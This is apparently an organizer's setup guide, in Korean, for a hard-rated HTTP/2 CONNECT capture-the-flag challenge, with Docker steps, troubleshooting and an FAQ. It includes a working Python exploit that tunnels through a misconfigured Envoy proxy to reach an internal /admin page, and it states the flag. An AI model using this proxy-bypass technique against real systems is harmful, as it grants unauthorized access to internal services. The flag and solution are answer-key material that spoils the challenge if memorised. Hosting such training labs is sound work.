# HTTP/2 CONNECT 워게임 - 주최자용 설정 가이드

## 빠른 시작

```bash
# 1. 챌린지 디렉토리로 이동
cd Playing-with-HTTP-2-CONNECT

# 2. 챌린지 환경 시작
docker-compose up -d

# 3. 서비스 실행 여부 확인
docker-compose ps

# 4. 접근성 테스트
curl http://localhost:10000/

# 5. 로그 확인 (선택 사항)
docker-compose logs -f
```

## 파일 구조 개요

```
Playing-with-HTTP-2-CONNECT/
├── README.txt                  # 참가자용 (최소 정보, 16라인)
├── WRITEUP.md                  # 관리자 전용 솔루션 (2500+ 라인)
├── SETUP.md                    # 본 파일 (주최자 가이드)
├── docker-compose.yml          # 인프라 정의 파일
├── .env.example                # 환경 변수 템플릿
├── .gitignore                  # Git 제외 설정
│
├── envoy/
│   └── envoy.yaml              # 취약한 프록시 설정
│
├── backend/
│   ├── Dockerfile              # 백엔드 컨테이너 정의
│   ├── requirements.txt        # Python 의존성
│   └── app.py                  # 취약한 Flask 앱
│
└── internal-service/
    ├── Dockerfile              # 내부 서비스 컨테이너 정의
    └── server.py               # 가짜 HTTP 서버
```

## 참가자에게 보이는 내용

**오직 이 파일만 제공됨**: `README.txt` (16라인, 힌트 없음)

```
HTTP/2 CONNECT Challenge - Hard Mode
=====================================

목표:
내부 네트워크에 숨겨진 플래그를 찾으십시오.

대상:
http://localhost:10000

참고:
- 이것은 블랙박스 챌린지입니다.
- 모든 취약점을 직접 찾아내야 합니다.
- 프록시 서버가 잘못 설정되어 있습니다.
- 플래그 형식: WSL{...}

행운을 빕니다.
```

## 주최자에게 제공되는 내용

1. **WRITEUP.md** (2500+ 라인):
   - 단계별 지침이 포함된 전체 솔루션
   - 공격 코드 (복사-붙여넣기 가능)
   - 네트워크 다이어그램
   - 방어 권고 사항
   - 교육적 배경 지식

2. **본 파일** (SETUP.md):
   - 빠른 설정 지침
   - 테스트 절차
   - 문제 해결 팁

## 배포 전 체크리스트

- [ ] Docker 및 Docker Compose 설치 여부
- [ ] 10000, 9901 포트 사용 가능 여부
- [ ] 최소 512MB RAM 여유 공간
- [ ] 주최자 컴퓨터에서 테스트 완료
- [ ] `.env` 파일 생성 (선택 사항, 기본값 사용 가능)
- [ ] 참가자에게 README.txt 배포
- [ ] WRITEUP.md 기밀 유지 (관리자 전용)

## 검증 단계

### 1. 빌드 및 시작

```bash
docker-compose up -d --build
```

예상 출력:
```
Creating network "playing-with-http-2-connect_external"
Creating network "playing-with-http-2-connect_internal"
Creating envoy.proxy ... done
Creating backend.acme.corp ... done
Creating internal.service ... done
```

### 2. 서비스 확인

```bash
docker-compose ps
```

예상 출력 (모두 "Up" 상태):
```
NAME                 IMAGE                                  STATUS
backend.acme.corp    playing-with-http-2-connect-backend    Up
envoy.proxy          envoyproxy/envoy:v1.28-latest          Up
internal.service     playing-with-http-2-connect-internal   Up
```

### 3. HTTP/2 지원 테스트

```bash
curl -v --http2 http://localhost:10000/
```

예상 결과: 응답에 `HTTP/2 200` 및 ACME Corp 백엔드 HTML이 포함되어야 함.

### 4. 공격 테스트 (주최자 검증용)

다음 테스트 스크립트를 생성합니다:

```python
# test_exploit.py
from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, DataReceived, StreamEnded
import socket

sock = socket.create_connection(('localhost', 10000), timeout=10)
config = H2Configuration(client_side=True)
conn = H2Connection(config=config)
conn.initiate_connection()
sock.sendall(conn.data_to_send())

# SETTINGS exchange
data = sock.recv(65535)
conn.receive_data(data)
sock.sendall(conn.data_to_send())

# CONNECT tunnel establishment
connect_stream_id = conn.get_next_available_stream_id()
connect_headers = [(':method', 'CONNECT'), (':authority', '172.20.0.10:8080')]
conn.send_headers(connect_stream_id, connect_headers, end_stream=False)
sock.sendall(conn.data_to_send())

data = sock.recv(65535)
conn.receive_data(data)
sock.sendall(conn.data_to_send())

# GET /admin request
request_stream_id = conn.get_next_available_stream_id()
request_headers = [
    (':method', 'GET'),
    (':scheme', 'http'),
    (':authority', 'internal.acme.corp'),
    (':path', '/admin'),
]
conn.send_headers(request_stream_id, request_headers, end_stream=True)
sock.sendall(conn.data_to_send())

# Read response
response_body = b''
stream_ended = False
while not stream_ended:
    data = sock.recv(65535)
    if not data:
        break
    events = conn.receive_data(data)
    for event in events:
        if isinstance(event, DataReceived) and event.stream_id == request_stream_id:
            response_body += event.data
            conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
        elif isinstance(event, StreamEnded) and event.stream_id == request_stream_id:
            stream_ended = True
    sock.sendall(conn.data_to_send())

sock.close()

if b'WSL{http2_authority_header_confusion}' in response_body:
    print("[✓] Exploit successful! Flag captured.")
else:
    print("[✗] Exploit failed!")
    print(response_body.decode('utf-8', errors='ignore'))
```

실행:
```bash
pip install h2
python test_exploit.py
```

예상 출력: `[✓] Exploit successful! Flag captured.`

## 문제 해결 (Troubleshooting)

### 문제: 10000 포트가 이미 사용 중임

**해결책**:
```bash
# 포트를 사용하는 프로세스 찾기
lsof -i :10000  # macOS/Linux
netstat -ano | findstr :10000  # Windows

# docker-compose.yml에서 포트 변경
ports:
  - "10001:10000"  # 다른 호스트 포트 사용
```

### 문제: 컨테이너가 시작되지 않음

**로그 확인**:
```bash
docker-compose logs backend
docker-compose logs proxy
docker-compose logs internal-service
```

**일반적인 원인**:
- 포트 충돌
- 메모리 부족
- Docker 데몬이 실행 중이지 않음

### 문제: 네트워크 연결 문제

**네트워크 확인**:
```bash
docker network ls
docker network inspect playing-with-http-2-connect_internal
docker network inspect playing-with-http-2-connect_external
```

**프록시에서 백엔드로의 연결 테스트**:
```bash
docker exec envoy.proxy ping -c 3 backend.acme.corp
docker exec envoy.proxy curl http://172.20.0.10:8080/
```

### 문제: 플래그가 나타나지 않음

**FLAG 환경 변수 확인**:
```bash
docker exec backend.acme.corp env | grep FLAG
```

예상 결과: `FLAG=WSL{http2_authority_header_confusion}`

**백엔드 직접 테스트**:
```bash
docker exec envoy.proxy curl -H "Host: internal.acme.corp" http://172.20.0.10:8080/admin
```

예상 결과: 플래그가 포함된 HTML.

## 커스터마이징

### 플래그 변경

`.env` 파일을 편집하거나 `docker-compose.yml`을 수정합니다:

```yaml
backend:
  environment:
    - FLAG=WSL{your_custom_flag_here}
```

변경 후 재시작:
```bash
docker-compose down
docker-compose up -d
```

### 네트워크 대역 변경

`docker-compose.yml`을 편집합니다:

```yaml
networks:
  internal:
    ipam:
      config:
        - subnet: 192.168.100.0/24  # 커스텀 대역

services:
  backend:
    networks:
      internal:
        ipv4_address: 192.168.100.10  # 커스텀 IP
```

**중요**: 변경된 IP를 반영하도록 WRITEUP.md를 업데이트하십시오.

### 미끼 서비스 추가

`docker-compose.yml`에 추가합니다:

```yaml
services:
  decoy1:
    image: nginx:alpine
    networks:
      internal:
        ipv4_address: 172.20.0.30
```

## 참가자 배포 가이드

### 참가자에게 제공할 것

1. **오직 README.txt**:
   ```bash
   # 참가자 파일만 압축
   tar czf http2-connect-challenge.tar.gz README.txt
   ```

2. **또는: 접속 URL** (원격 호스팅 시):
   - 대상 URL만 제공 (예: http://your-server:10000)
   - 파일 없이 순수 블랙박스로 진행

### 기밀로 유지해야 할 것

- ❌ WRITEUP.md (솔루션 가이드)
- ❌ docker-compose.yml (네트워크 토폴로지 노출)
- ❌ envoy/envoy.yaml (취약점 노출)
- ❌ backend/app.py (접근 제어 로직 노출)
- ❌ 본 파일 (SETUP.md)

## 참가자 모니터링

### 접속 로그 확인

```bash
# 실시간 프록시 로그
docker-compose logs -f proxy

# 백엔드 접속 로그
docker-compose logs -f backend
```

### 공격 시도 추적

로그에서 다음 패턴을 확인하십시오:

1. **HTTP/2 탐지**: 로그에 `HTTP/2`가 포함된 요청
2. **CONNECT 시도**: 프록시 로그의 `:method: CONNECT`
3. **내부 IP 스캔**: 172.20.0.x로의 다수 CONNECT 요청
4. **관리자 접근**: GET /admin 요청
5. **성공**: :authority = internal.acme.corp인 /admin에 대한 200 응답

## 정리 (Cleanup)

### 챌린지 중단

```bash
# 서비스 중단
docker-compose down

# 서비스 중단 및 볼륨 삭제
docker-compose down -v

# 이미지 삭제 (선택 사항)
docker-compose down --rmi all
```

### 다음 세션을 위해 초기화

```bash
docker-compose down -v
docker-compose up -d --build
```

## 지원

### 참가자 지원 (챌린지 진행 중)

WRITEUP.md의 8.4 섹션에 있는 힌트를 순서대로 제공하십시오:

1. 힌트 1: 프로토콜 버전
2. 힌트 2: CONNECT 메서드
3. 힌트 3: 내부 네트워크 대역
4. 힌트 4: :authority 헤더
5. 힌트 5: 정확한 값 (최후의 수단)

### 주최자 지원

- 기술적 세부 사항은 WRITEUP.md를 참조하십시오.
- Docker 로그에서 오류를 확인하십시오.

## 보안 유의 사항

### 실제 운영 환경 배포 시

인터넷에서 접근 가능한 서버에 호스팅하는 경우:

1. **방화벽 규칙 사용**:
   ```bash
   # 특정 IP만 허용
   iptables -A INPUT -p tcp --dport 10000 -s PARTICIPANT_IP -j ACCEPT
   iptables -A INPUT -p tcp --dport 10000 -j DROP
   ```

2. **인증 사용**:
   - 기본 인증(Basic Auth)이 있는 리버스 프록시 추가
   - 등록된 참가자에게만 자격 증명 제공

3. **속도 제한 (Rate Limiting)**:
   - 리소스 고갈 방지
   - 속도 제한 기능이 있는 nginx 리버스 프록시 사용

4. **모니터링**:
   - 오용 감시 (외부 대상을 향한 포트 스캐닝 등)
   - 의심스러운 활동에 대한 알림 설정

### 법적 고려 사항

- 참가자들이 이것이 승인된 테스트임을 이해하도록 하십시오.
- README.txt에 면책 조항을 포함하십시오.
- 책임 소재를 명확히 하기 위해 모든 활동을 기록하십시오.

## FAQ

**Q: 참가자들이 HTTP/2 지식 없이 이 문제를 풀 수 있나요?**
A: 어렵지만 가능합니다. 필요성을 인지한 후 HTTP/2를 연구할 수 있습니다.

**Q: Burp Suite 같은 자동화 도구를 사용하면 어떻게 되나요?**
A: Burp Suite가 도움이 될 수 있지만 여전히 HTTP/2 CONNECT에 대한 이해가 필요합니다. 정당한 도구 사용으로 간주합니다.

**Q: 시간 제한은 어느 정도가 적당한가요?**
A: 대회인 경우 3-4시간을 권장하며, 교육용인 경우 무제한으로 두어도 좋습니다.

**Q: Python 없이도 풀 수 있나요?**
A: 이론적으로는 가능하지만(Go, Node.js 등 사용), h2 라이브러리가 있는 Python이 가장 실용적입니다.

**Q: 초보자에게 적합한가요?**
A: 아니요. 이 문제는 "어려움" 등급입니다. 초보자에게는 더 많은 힌트를 주거나 가이드를 동반한 학습 실습으로 사용하십시오.

**Q: 챌린지를 수정해도 되나요?**
A: 네! 위의 커스터마이징 섹션을 참조하십시오. 수정 시 WRITEUP.md도 그에 맞게 업데이트하십시오.

---

**설정 가이드 완료!**

모든 파일이 성공적으로 생성되었습니다:
- ✅ README.txt (16라인, 참가자용)
- ✅ WRITEUP.md (2500+ 라인, 전체 솔루션)
- ✅ docker-compose.yml (서비스 3개, 네트워크 2개)
- ✅ envoy/envoy.yaml (취약한 프록시 설정)
- ✅ backend/app.py (취약한 Flask 앱)
- ✅ backend/Dockerfile + requirements.txt
- ✅ internal-service/Dockerfile + server.py
- ✅ .gitignore
- ✅ .env.example

**다음 단계**:
1. 환경 테스트: `docker-compose up -d`
2. 공격 작동 확인: 위의 테스트 스크립트 실행
3. 참가자에게 README.txt 배포
4. WRITEUP.md는 본인만 보관

워게임 진행에 행운을 빕니다!
